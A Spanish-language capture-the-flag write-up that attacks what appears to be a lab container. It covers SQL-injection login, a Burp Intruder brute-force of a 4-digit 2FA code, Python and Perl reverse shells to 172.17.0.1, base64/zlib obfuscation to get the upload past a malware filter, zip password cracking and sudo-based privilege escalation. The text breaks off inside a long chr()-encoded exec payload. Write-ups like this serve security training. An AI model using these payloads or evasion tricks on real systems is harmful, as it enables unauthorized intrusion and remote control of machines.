# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 3000 172.17.0.2 -oN nmap
```

![image](https://github.com/user-attachments/assets/fb273d91-d7aa-4520-a861-d7a1c696546e)

solo existe el puerto 80, asi que chequeare el servicio web

![image](https://github.com/user-attachments/assets/8fa08ce1-773d-4c32-a531-5433570d48e3)

me consigo un panel de login que al probar una inyeccion basica logro el acceso (bueno, aun no, como se observa cuenta un el sistema de doble autenticacion)

![image](https://github.com/user-attachments/assets/6d35c101-cb15-4191-b9b3-55417f04a06b)

aqui intentare bypassear el `2FA`, lo primero es conocer despues de cuantos intentos fallidos me saca de la sesion y despues de testear, al 4to intento fallido me saca y tengo que
volver a colocar las credenciales, otro dato que necesitamos es de cuantos digitos el codigo `2FA` que es de 4 numeros, ya sabiendo estos datos abro `BurpSuite` para realizar el bypass
ubicandome en `proxy >> HTTP history` para chequear si las solicitudes se van capturando cuando inicie sesion


![image](https://github.com/user-attachments/assets/367824c2-7003-40b0-80b3-314e3be58c70)

el navegador lo configuramos para que pase a traves del proxy de `BurpSuite` (sin activar la intercecion de peticiones en burpsuite) y a continuacion vamos a:

```bash
1) acceder a http://172.17.0.2 [Solicitud GET panel de login]
2) iniciar sesion (a traves de la inyeccion sql como la primera vez) [Solicitud POST inicio de sesion]
3) pagina de validacion de doble Autenticacion [Solicitud GET 2FA]
4 probamos cualquier nuemero de 4 digitos en el `2FA` [Solicitud POST 2FA]
```

como resultado debemos tener en el historico de `Burpsuite` lo siguiente:

![image](https://github.com/user-attachments/assets/b85dbd9f-6d8f-496c-83c2-15bcbae6c321)

aqui ya observamos las peticiones capturadas las cuales usaremos a continuacion:

```bash
1) vamos al apartado de configuraciones >> Session Handling
```

![image](https://github.com/user-attachments/assets/afc8fe7c-972b-431e-a7f6-eb5249054465)


ahora agregaremos una nueva regla, aqui vamos a seleccionar `Include all URL's`

![image](https://github.com/user-attachments/assets/d5edbbba-dbe5-4d74-8daa-847fdffca598)

ahora nos vamos a `rules actions`

![image](https://github.com/user-attachments/assets/69a83db7-9c3a-423a-8f8f-03787906e602)

clicamos sobre `add` y nos vamos a `run a macro`

![image](https://github.com/user-attachments/assets/ac70bfb2-3c8b-4f2d-85e9-56e914bb0267)

ahora en `selec macro` clicamos en `add` y seleccionamos las 3 primeras peticiones

![image](https://github.com/user-attachments/assets/70b72e2e-4bb5-4907-920a-b10a264959d5)

```bash
primera peticion = login (GET)
segunda peticion = login (POST)
tercero peticion = 2FA (GET)
```

nos quedaria asi:

![image](https://github.com/user-attachments/assets/bae54994-db50-48e8-bec1-043e26882038)

ahora nos vamos a historial de peticiones capturadas y enviamos la 4ta peticion (2FA POST) al `intruder`

![image](https://github.com/user-attachments/assets/13c32901-60d6-4de4-a6ef-488ec63b13ef)

ahora nos toca configurar el ataque en el `intruder` para bypassear el `2FA`

```bash
el payload lo configuramos en el valor de code (1234, en este caso)
tipo de payload = numbers
rango de numeros = desde 0 hasta 9999
formato numerico = decimal
cantidad minima de digitos = 4
cantidad maxima de digitos = 4
```

![image](https://github.com/user-attachments/assets/31985444-3a78-4c60-89d0-24805104dfdf)

ahora nos vamos a `settings >> Error Handling`

```bash
aqui vamos a establecer despues de 4 intentos fallidos que vuelva a logearse y continuar haciendo pruebas, asi como el tiempo de espera
```

![image](https://github.com/user-attachments/assets/bda548df-63aa-4d00-8a11-05e2db2fe150)

 ya configurado todo lanzamos el ataque

 ![image](https://github.com/user-attachments/assets/d9bdb3b3-018d-4dcb-8e6e-035f87c97226)

aqui esperaremos hasta conseguir el codigo de estado `302` que representa redireccion

![image](https://github.com/user-attachments/assets/faea4d60-4d8d-4643-9924-7a3654e3c429)

despues de un buen rato de espera conseguimos el codigo `302`, le damos clic derecho y seleccionamos la opcion `show response browser` y nos aparecera la siguiente ventana

![image](https://github.com/user-attachments/assets/6f6ea9aa-40a0-41ba-be3f-4d8a32f77dcd)

copiamos la URL y la pegamos en el navegador

![image](https://github.com/user-attachments/assets/4c3f5a2f-b601-4171-ba95-6cda89b1d5e3)

hemos bypasseado el `2FA` y vemos que podemos cargar script de `python` y observar el resultado, por lo que cargare un script de prueba a ver como funciona

```ruby
#script
print("puedo ejecutar comandos de sistema?")
```

guardo el codigo en un archivo `comandos.py` y lo cargo

![image](https://github.com/user-attachments/assets/9fd89725-da15-46cd-9665-423005763539)

vemos que se imprime el texto de nuestro script, por lo que intentare cargar una `revershell`, edito el mismo archivo `comandos.py` y le cargo el siguiente codigo

revershell
```ruby
import subprocess
comando = "/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4000 0>&1'"
subprocess.run(comando, shell=True)
```

me coloco en escucha por `Netcat` `nc -lnvp 4000` y cargo el script en la web

![image](https://github.com/user-attachments/assets/1260e75a-46cb-46b1-bfc6-2f4d72e9d3b1)

la web esta detectando que el codigo cargado es malicioso, asi que intento con otra `revershell` pero igual me lo sigue detectando, asi que la ultima opcion que se me ocurre es
ofuscar el script de python con la `revershell` a ver si funciona, por lo que me voy a la siguiente web: `https://freecodingtools.org/py-obfuscator` y ofusco mi codigo python con la `revershell`

![image](https://github.com/user-attachments/assets/a6fced80-8d14-4281-af4a-b5995b1c4b8c)

copio el codigo ofuscado y lo guardo en el script `comandos.py`

```bash
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
```

cargo el codigo nuevamente (estando en escucha por netcat)

![image](https://github.com/user-attachments/assets/d5a0a6e7-acd9-4deb-ad77-adc9f2755c60)

ahora si logro ejecutar el codigo malicioso `ofuscando` el script de python

# Escalada de Privilegios

### www-data

tratamiento de la tty

```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```

existen 3 user en el sistema: `maci`, `darksblack` & `juan` si busco archivos que le pertenezcan a estos usuarios obtengo resultado con el user `maci`

```ruby
find / -type f -user maci 2>/dev/null
/var/backups/.maci/.-/-/archivo500.zip
```

intento descomprimir pero no esta instalado en el sistema `zip` ni tampoco `7zip` asi que levanto un server python para descargarlo en mi maquina atacante para ver de que trata

![image](https://github.com/user-attachments/assets/197d8b02-190b-441c-b22d-3d5944a4a680)

por lo que pinta, son 500 archivos .zip comprimidos uno dentro de otro, asi que como es mucho trabajo descomprimir uno por uno creare un script en `bash` para automatizar este proceso

```ruby
#!/bin/bash

archivo="archivo500.zip"

while [[ -f "$archivo" ]]; do # mientras exitra un archivo .zip en la variable 'archivo' el script se ejecutara

       unzip "$archivo" |grep -v Archive |grep -v inflating # descomprimo el primer archivo .zip

       archivo2=$(unzip -l "$archivo" |grep -v Archive |grep -w zip |awk '{print $4}') # extraigo el nombre del siguiente archivo a descomprimir y lo almaceno en una variable

      rm -rf "$archivo" # elimino el archivo .zip que ya use

      archivo="$archivo2"
done
```
lo aguardo en un archivo `extract.sh` le doy permisos de ejecucion y lo ubico en el mismo directorio donde se encuentra el archivo `archivo500.zip` y lo ejecuto

![image](https://github.com/user-attachments/assets/784c1055-b02d-4e39-b9f2-c20401423d5e)

aqui observo que al llegar al archivo `archivo0.zip` solicita una password para poder descomprimir, si cancelo la ejecucion del scrip, termina borrando el ultimo .zip `archivo0.zip` por lo
que tego que modificar el script para que se detenga al llegar a dicho archivo...

```ruby
#!/bin/bash

archivo="archivo500.zip"

while [[ -f "$archivo" ]]; do # mientras exitra un archivo .zip en la variable 'archivo' el script se ejecutara

       unzip "$archivo" |grep -v Archive |grep -v inflating # descomprimo el primer archivo .zip

       archivo2=$(unzip -l "$archivo" |grep -v Archive |grep -w zip |awk '{print $4}') # extraigo el nombre del siguiente archivo a descomprimir y lo almaceno en una variable

      rm -rf "$archivo" # elimino el archivo .zip que ya use

      archivo="$archivo2"


      # condicional para que cuando llegue al archivo archivo0.zip que solicita password, salga del script y asi evitar eliminar el ultimo archivo
      if [[ "$archivo" == "archivo0.zip" ]]; then
           break
      fi

done
```
vuelvo a traerme el archivo .zip desde el servidor y ejecuto el script modificado para detenerse en el archivo `archivo0.zip`

![image](https://github.com/user-attachments/assets/0714da08-9160-4c7d-a29d-9cfbce548855)

tenemos el archivo que solicita password para ser descomprimido por lo que intentare crackear la password

```ruby
zip2john archivo0.zip > hashzip # extraigo el hash
```

se lo paso a `john`

```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt hashzip
```

y obtenemos la password asi que procedemos a descomprimir

```ruby
unzip -o archivo0.zip
```

![image](https://github.com/user-attachments/assets/8eb736c5-7b12-4066-bd51-ea336d437d25)

hemos obtenido las credenciales del user `maci` asi que pivoto de user

### maci

```ruby
sudo -l
Matching Defaults entries for maci on e55b7a4cbc6e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on e55b7a4cbc6e:
    (darksblack) NOPASSWD: /usr/bin/irssi
```

puedo ejecutar el binario `/usr/bin/irssi` como el user `darksblack`, investigo de que trata el binario y me toca leer la documentacion ya que no esta en `GTFOBINS` para la escalada


![image](https://github.com/user-attachments/assets/e000294c-6aa1-46a3-9a2c-31e5f51f3e8b)

por aqui puedo ver que se pueden ejecutar script, e investigando un poco mas, los script que se pueden ejecutar con los de `Perl` asi que hago una prueba con el siguiente codigo:

```ruby
#!/usr/bin/perl
#script para la ejecucion de comandos con irssi
use strict;
use warnings;

# Comando a ejecutar
my $command = "whoami";  # Cambia esto por el comando que desees

# Ejecutar el comando y capturar la salida
my $output = qx($command);

# Imprimir la salida
print "Salida del comando:\n$output";
```
lo guardo en el archivo `script.pl` en `/tmp` para que el user `darksblack` pueda acceder a el, despues ejecuto el binario como `darksblack`

```bash
sudo -u darksblack /usr/bin/irssi
```

![image](https://github.com/user-attachments/assets/b85e3be0-9732-425b-9e2e-75edcfecd63f)


aqui es donde ejecutare el scrip de perl a ver si funciona segun la documentacion

```bash
/run /tmp/script.pl
```

![image](https://github.com/user-attachments/assets/7c20cda9-a85d-4d34-9ccb-2b0357cbabff)

se ejecuta el codigo correctamente (recordemos que habia solo ejecutado un whoami como prueba) asi que puedo lanzar una `revershell` por lo que tendre que modificar el script de `perl`
para enviar la `revershell`

```ruby
#!/usr/bin/perl
#script para la ejecucion de comandos con irssi
use strict;
use warnings;

# Comando a ejecutar
my $command = "/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4001 0>&1'";  # Cambia esto por el comando que desees

# Ejecutar el comando y capturar la salida
my $output = qx($command);

# Imprimir la salida
print "Salida del comando:\n$output";
```
me coloco en escucha por netcat y vuelvo ejecutar el script desde el binario siendo ejecutado como `darksblack`

![image](https://github.com/user-attachments/assets/21badc1b-7740-45c4-9dc3-7fbd9bff39f2)


### darksblack

tratamiento de la tty

```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```

```ruby
sudo -l
Matching Defaults entries for darksblack on e55b7a4cbc6e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User darksblack may run the following commands on e55b7a4cbc6e:
    (juan) NOPASSWD: /usr/bin/python3 /home/juan/shell.py
    (juan) NOPASSWD: /bin/cat /home/juan/shell.py
```
puedo ejecutar un script en python como el user `juan`, pero tambien puedo leerlo, asi que primero lo leere a ver de que trata el script

```ruby
sudo -u juan /bin/cat /home/juan/shell.py
```
```bash
exec("".join([chr(105), chr(109), chr(112), chr(111), chr(114), chr(116), chr(32), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(59), chr(32), chr(101), chr(120), chr(101), chr(99), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(54), chr(52), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(51), chr(50), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(39), chr(77), chr(70), chr(76), chr(84), chr(67), chr(53), chr(51), chr(67), chr(71), chr(78), chr(70), chr(68), chr(65), chr(83), chr(75), chr(73), chr(74), chr(89), chr(50), chr(87), chr(71), chr(53), chr(51), chr(81), chr(79), chr(66), chr(82), chr(70), chr(81), chr(81), chr(84), chr(87), chr(77), chr(78), chr(88), chr(70), chr(67), chr(90), chr(51), chr(67), chr(71), chr(78), chr(71), chr(85), chr(87), chr(89), chr(75), chr(88), chr(71), chr(70), chr(51), chr(87), chr(69), chr(77), chr(50), chr(75), chr(71), chr(66), chr(69), chr(85), chr(81), chr(84), chr(82), chr(82), chr(76), chr(70), chr(88), chr(69), chr(69), chr(54), chr(76), chr(67), chr(71), chr(74), chr(72), chr(71), chr(89), chr(89), chr(90), chr(84), chr(74), chr(86), chr(70), chr(87), chr(67), chr(86), chr(90), chr(82), chr(79), chr(53), chr(82), chr(68), chr(71), chr(83), chr(82), chr(81), chr(74), chr(70), chr(69), chr(69), chr(52), chr(53), chr(83), chr(90), chr(71), chr(74), chr(50), chr(71), chr(89), chr(90), chr(67), chr(66), chr(79), chr(66), chr(89), chr(71), chr(69), chr(87), chr(67), chr(67), chr(79), chr(89), chr(70), chr(71), chr(71), chr(51), chr(83), chr(82), chr(77), chr(53), chr(83), chr(69), chr(79), chr(51), chr(68), chr(85), chr(76), chr(74), chr(73), chr(87), chr(54), chr(83), chr(50), chr(84), chr(73), chr(85), chr(52), chr(86), chr(73), chr(86), chr(83), chr(68), chr(73), chr(69), chr(52), chr(85), chr(83), chr(81), chr(50), chr(74), chr(80), chr(66), chr(72), chr(72), chr(85), chr(83), chr(76), chr(86), chr(74), chr(86), chr(75), chr(71), chr(71), chr(53), chr(75), chr(78), chr(73), chr(77), chr(50), chr(72), chr(81), chr(84), chr(50), chr(69), chr(74), chr(86), chr(85), chr(85), chr(71), chr(51), chr(67), chr(67), chr(75), chr(66), chr(75), chr(87), chr(89), chr(85), chr(76), chr(72), chr(75), chr(66), chr(74), chr(85), chr(67), chr(77), chr(75), chr(78), chr(73), chr(82), chr(65), chr(88), chr(83), chr(81), chr(51), chr(72), chr(79), chr(66), chr(86), chr(86), chr(85), chr(86), chr(50), chr(90), chr(77), chr(53), chr(77), chr(84), chr(69), chr(79), chr(76), chr(86), chr(77), chr(74), chr(87), chr(86), chr(77), chr(50), chr(84), chr(69), chr(73), chr(78), chr(85), chr(71), chr(54), chr(67), chr(84), chr(67), chr(71), chr(78), chr(72), chr(68), chr(65), chr(84), chr(67), chr(68), chr(73), chr(74), chr(51), chr(87), chr(69), chr(77), chr(50), chr(75), chr(71), chr(66), chr(70), chr(86), chr(73), chr(51), chr(50), chr(76), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(74), chr(66), chr(71), chr(87), chr(79), chr(85), chr(67), chr(84), chr(73), chr(74), chr(53), chr(71), chr(69), chr(77), chr(83), chr(79), chr(79), chr(74), chr(78), chr(70), chr(81), chr(85), chr(76), chr(86), chr(77), chr(77), chr(90), chr(68), chr(83), chr(50), chr(84), chr(66), chr(71), chr(74), chr(76), chr(68), chr(65), chr(83), chr(50), chr(73), chr(74), chr(90), chr(51), chr(70), chr(83), chr(77), chr(84), chr(85), chr(78), chr(82), chr(83), chr(69), chr(71), chr(78), chr(75), chr(67), chr(75), chr(74), chr(87), chr(68), chr(83), chr(83), chr(83), chr(85), chr(78), chr(78), chr(76), chr(70), chr(75), chr(84), chr(67), chr(68), chr(73), chr(74), chr(53), chr(71), chr(69), chr(77), chr(83), chr(79), chr(79), chr(74), chr(78), chr(70), chr(81), chr(85), chr(76), chr(86), chr(66), chr(74), chr(75), chr(84), chr(65), chr(79), chr(75), chr(69), chr(75), chr(77), chr(89), chr(84), chr(83), chr(86), chr(67), chr(87), chr(73), chr(90), chr(70), chr(69), chr(77), chr(85), chr(75), chr(86), chr(71), chr(66), chr(89), chr(69), chr(71), chr(50), chr(75), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(84), chr(50), chr(74), chr(82), chr(87), chr(85), chr(52), chr(53), chr(84), chr(67), chr(78), chr(85), chr(50), chr(87), chr(89), chr(87), chr(74), chr(84), chr(75), chr(70), chr(88), chr(85), chr(87), chr(82), chr(51), chr(73), chr(79), chr(90), chr(82), chr(84), chr(71), chr(85), chr(76), chr(84), chr(74), chr(70), chr(69), chr(69), chr(69), chr(53), chr(84), chr(68), chr(78), chr(90), chr(73), chr(88), chr(65), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(82), chr(87), chr(50), chr(86), chr(82), chr(81), chr(77), chr(82), chr(77), chr(69), chr(85), chr(53), chr(75), chr(74), chr(74), chr(66), chr(71), chr(85), chr(87), chr(81), chr(51), chr(78), chr(75), chr(74), chr(87), chr(65), chr(85), chr(87), chr(84), chr(74), chr(73), chr(73), chr(90), chr(86), chr(83), chr(86), chr(51), chr(77), chr(71), chr(66), chr(77), chr(68), chr(69), chr(87), chr(84), chr(87), chr(77), chr(78), chr(87), chr(68), chr(83), chr(50), chr(84), chr(67), chr(71), chr(73), chr(89), chr(88), chr(73), chr(87), chr(75), chr(88), chr(71), chr(86), chr(86), chr(85), chr(87), chr(83), chr(67), chr(78), chr(79), chr(66), chr(72), chr(87), chr(79), chr(51), chr(51), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(50), chr(73), chr(53), chr(68), chr(68), chr(65), chr(87), chr(75), chr(84), chr(73), chr(69), chr(52), chr(85), chr(83), chr(83), chr(67), chr(78), chr(79), chr(86), chr(82), chr(87), chr(50), chr(86), chr(84), chr(75), chr(77), chr(82), chr(85), chr(87), chr(79), chr(54), chr(67), chr(78), chr(73), chr(82), chr(69), chr(84), chr(65), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(81), chr(86), chr(79), chr(87), chr(76), chr(72), chr(76), chr(74), chr(68), chr(85), chr(77), chr(77), chr(65), chr(75), chr(76), chr(70), chr(74), chr(85), chr(67), chr(79), chr(75), chr(81), chr(75), chr(78), chr(65), chr(87), chr(83), chr(89), chr(50), chr(89), chr(75), chr(90), chr(89), chr(71), chr(73), chr(82), chr(84), chr(89), chr(79), chr(86), chr(69), chr(87), chr(85), chr(51), chr(50), chr(76), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(74), chr(53), chr(69), chr(89), chr(51), chr(75), chr(79), chr(79), chr(78), chr(82), chr(68), chr(71), chr(84), chr(84), chr(77), chr(74), chr(78), chr(66), chr(87), chr(87), chr(83), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(67), chr(80), chr(74), chr(83), chr(86), chr(81), chr(84), chr(76), chr(86), chr(76), chr(74), chr(77), chr(71), chr(81), chr(52), chr(68), chr(69), chr(73), chr(78), chr(84), chr(88), chr(79), chr(83), chr(50), chr(82), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(52), chr(70), chr(69), chr(83), chr(54), chr(75), chr(67), chr(71), chr(66), chr(81), chr(85), chr(79), chr(86), chr(76), chr(72), chr(77), chr(77), chr(90), chr(68), chr(83), chr(50), chr(84), chr(66), chr(71), chr(74), chr(76), chr(68), chr(65), chr(83), chr(75), chr(72), chr(75), chr(74), chr(89), chr(70), chr(85), chr(86), chr(50), chr(82), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(68), chr(86), chr(77), chr(52), chr(51), chr(66), chr(75), chr(53), chr(77), chr(87), chr(79), chr(89), chr(83), chr(72), chr(75), chr(90), chr(50), chr(85), chr(87), chr(82), chr(50), chr(83), chr(78), chr(66), chr(83), chr(69), chr(79), chr(82), chr(76), chr(81), chr(74), chr(70), chr(67), chr(68), chr(65), chr(79), chr(75), chr(74), chr(73), chr(82), chr(65), chr(84), chr(77), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(77), chr(78), chr(87), chr(86), chr(77), chr(77), chr(68), chr(69), chr(76), chr(66), chr(70), chr(72), chr(75), chr(67), chr(83), chr(74), chr(73), chr(90), chr(74), chr(72), chr(83), chr(90), chr(67), chr(88), chr(75), chr(86), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(79), chr(86), chr(84), chr(84), chr(77), chr(77), chr(90), chr(70), chr(75), chr(78), chr(83), chr(68), chr(77), chr(53), chr(88), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(81), chr(81), chr(84), chr(90), chr(77), chr(73), chr(90), chr(69), chr(50), chr(90), chr(50), chr(81), chr(75), chr(78), chr(66), chr(72), chr(85), chr(90), chr(67), chr(88), chr(74), chr(74), chr(51), chr(87), chr(71), chr(51), chr(74), chr(90), chr(78), chr(74), chr(78), chr(70), chr(81), chr(84), chr(84), chr(50), chr(74), chr(82), chr(87), chr(69), chr(69), chr(53), chr(84), chr(68), chr(73), chr(53), chr(76), chr(72), chr(75), chr(83), chr(50), chr(72), chr(75), chr(74), chr(85), chr(71), chr(73), chr(82), chr(50), chr(70), chr(79), chr(78), chr(69), chr(85), chr(81), chr(84), chr(84), chr(80), chr(66), chr(74), chr(78), chr(70), chr(79), chr(54), chr(68), chr(84), chr(75), chr(66), chr(76), chr(70), chr(69), chr(54), chr(76), chr(69), chr(75), chr(53), chr(75), chr(88), chr(71), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), 